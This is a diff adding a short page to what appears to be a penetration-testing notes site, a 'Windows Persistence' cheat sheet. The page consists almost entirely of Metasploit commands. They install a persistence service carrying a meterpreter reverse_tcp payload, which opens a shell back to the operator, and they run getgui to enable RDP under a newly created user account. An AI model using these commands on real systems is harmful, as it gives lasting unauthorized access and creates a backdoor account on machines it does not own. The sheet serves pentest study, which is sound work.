@@ -1,0 +1,20 @@
++++
+title = "Persistence"
+weight = 40
++++
+
+# Windows Persistence
+
+
+```bash
+# msfcosole - Admin Meterpreter
+search platform:windows persistence
+use exploit/windows/local/persistence_service
+set payload windows/meterpreter/reverse_tcp
+set LPORT <PORT>
+set SESSION 1
+run
+
+# Meterpreter - Enable RDP
+run getgui -e -u <NEWUSER> -p <PW>
+```
